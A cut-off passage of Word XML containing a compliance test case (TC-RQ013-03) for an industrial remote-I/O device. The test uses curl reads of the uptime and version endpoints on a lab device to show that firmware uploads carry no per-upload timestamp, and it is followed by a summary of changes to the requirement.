      <w:r w:rsidRPr="00BA4097">
        <w:pict w14:anchorId="46C1D011">
          <v:rect id="_x0000_i1882" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="100E021F" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ013-03 — Per-Upload Timestamp Absence (G-2 proof — decisive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04740FD2" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097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7746"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="26AD05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8FAA60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8822D4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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="5858B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7E4BA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E98CC" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>TC-RQ013-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="72CAE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DF8B2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AA579" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>RQ-013 → CR 2.11 / CR 3.9 → Asset I</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="3C699A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3B4FD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33F20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Repudiation (upload cannot be dated → 5-year window cannot be started)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="0F48C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B7062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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA409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32B80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t>SVV-3</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Vulnerability Testing — time/log review)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="01F63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B23EE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E5D19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 xml:space="preserve">Demonstrate that a firmware upload carries </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no absolute per-upload timestamp</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: no RTC, the install forces a cold start that resets uptime, and no date/time is attached to the version change — so the mandated "5 years after each upload" retention clock cannot be established on-device.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="22FBE4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E41C3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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097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DB6D6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1. Read the systick/uptime and current version before an upload. 2. Perform an upload (forces install reboot). 3. After reboot, read systick/uptime and version. 4. Confirm the time base reset and that no absolute date/time is associated with the upload event.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="009E77F2" w14:paraId="71220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C6AB0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5BDE0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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> iff a per-upload absolute timestamp is recorded and retained. </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> uptime resets, no RTC, no absolute time on the version change → per-upload retention clock cannot be started → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="009E77F2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (decisive).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42B37C0F" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097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5670"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="3D18AB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AB243C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9A1B5E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r w:rsidRPr="00BA4097">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="49E42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86334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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA409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2BEF3" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t>TC-RQ013-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="16156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82A2E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lastRenderedPageBreak/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70772" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">Spare DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BA4097" w:rsidRPr="00BA4097" w14:paraId="0C11E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D2285" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00BA4097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23902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t>curl</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve"> (/systemtime/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>systick</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00BA4097">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="25350EEF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># TC-RQ013-03 Confirm no absolute per-upload timestamp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8AB439" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:instrText>HYPERLINK "http://192.168.0.2/systemtime/systick"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>http://192.168.0.2/systemtime/systick</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1303_tick_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0730E0E7" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:instrText>HYPERLINK "http://192.168.0.2/firmware/version"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>http://192.168.0.2/firmware/version</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1303_ver_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7930AA7F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># --- UPLOAD (install forces reboot / cold start) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B09CD43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 xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>HYPERLINK "http://192.168.0.2/systemtime/systick"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>http://192.168.0.2/systemtime/systick</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1303_tick_post.json # expect: reset toward 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22145863" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:instrText>HYPERLINK "http://192.168.0.2/firmware/version"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>http://192.168.0.2/firmware/version</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1303_ver_post.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018F87AA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># analyse: tick_post &lt;&lt; tick_pre; no absolute date/time on the version change</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5432FC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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | tick_post &lt;&lt; tick_pre (uptime reset, SRIO-15398); no absolute timestamp anywhere on the upload/version change; no RTC. | | </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ No per-upload timestamp (G-2 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1303_tick_pre/post.json, TC1303_ver_pre/post.json, log-review note per NIST SP 800-115 §3.2 | </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>HYPERLINK "https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/209_SRIO_CompSpec_Module_Com%20_%2020_System%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[209_SRIO_C...e_RemoteIO | PDF]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B34F087" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00BA4097">
        <w:pict w14:anchorId="1458065A">
          <v:rect id="_x0000_i1883" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FC172E" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="009E77F2" w:rsidRDefault="00BA4097" w:rsidP="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-013)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A11F2A9" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cross-referenced the shared retention mechanics</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>self-erasing install</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008 (G-3/TC-RQ008-02)</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; the </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>circular-buffer/cold-start clearing</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012 (G-1/G-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve">RQ-013 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>now</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>owns</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>only</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>version</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>-upload-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>specific</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>gaps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D972B04" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scoped G-1/G-2 to version-history + per-upload timestamp</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the two genuinely RQ-013-unique findings; the "device witnesses every upload" nuance is attributed to </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008's</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> UPDATE_COMPLETED event and consumed only to argue*"raw material exists but is not retained."* </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>HYPERLINK "https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/Market_Access_and_Compliance_Innovation_for_Aibased_Functional_Safety_Systems.pdf"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>Market_Acc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>ty_Systems</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t xml:space="preserve"> | PDF]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5A0854" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Retained the decisive, bulletproof G-2</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no per-upload absolute timestamp</w:t>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no RTC; install forces uptime reset) → the per-upload 5-year clock cannot be started; no external record can cure this for a specific unit. </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText>HYPERLINK "https://ifmworld-my.sharepoint.com/personal/nathalie_nuber_ifm_com/Documents/Microsoft%20Copilot%20Chat%20Files/209_SRIO_CompSpec_Module_Com%20_%2020_System%20_%20Documents%20%26%20Pages%20_%20Safe_RemoteIO.pdf"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>[209_SRIO_C...</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t>e_RemoteIO</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t xml:space="preserve"> | PDF]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA4097">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FE4A1E" w14:textId="77777777" w:rsidR="00BA4097" w:rsidRPr="00BA4097" w:rsidRDefault="00BA4097">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="009E77F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
